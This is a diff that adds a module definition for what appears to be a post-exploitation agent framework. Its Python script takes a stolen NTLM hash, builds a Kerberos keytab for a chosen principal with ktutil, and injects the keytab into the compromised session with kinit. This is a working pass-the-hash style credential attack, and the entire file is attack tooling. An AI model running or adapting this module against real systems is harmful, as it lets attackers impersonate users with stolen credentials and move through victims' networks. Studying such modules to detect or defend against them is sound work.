@@ -1,0 +1,51 @@
+name: Kerberos inject
+authors:
+  - '@424f424f'
+description: Generates a kerberos keytab and injects it into the current runspace.
+software: ''
+techniques:
+  - T1055
+background: false
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments:
+  - Thanks to @passingthehash for bringing this up.
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+  - name: Keytab
+    description: Keytab file to create.
+    required: true
+    value: user.keytab
+  - name: Principal
+    description: The service principal name. user@HACKME.COM
+    required: true
+    value: ''
+  - name: Hash
+    description: NTLM Hash for the principal.
+    required: true
+    value: ''
+script: |
+  import subprocess
+  try:
+      print("Creating Keytab..")
+      cmd = 'ktutil -k {{ Keytab }} add -p {{ Principal }} -e arcfour-hmac-md5 -w {{ Hash }} --hex -V 5'
+      print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
+      print("")
+      print("Keytab created!")
+  except Exception as e:
+      print(e)
+
+  try:
+      print("Injecting kerberos key..")
+      cmd = 'kinit -t {{ Keytab }} {{ Principal }}'
+      print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
+      print("")
+      print("Keytab injected into current session!")
+  except Exception as e:
+      print(e)
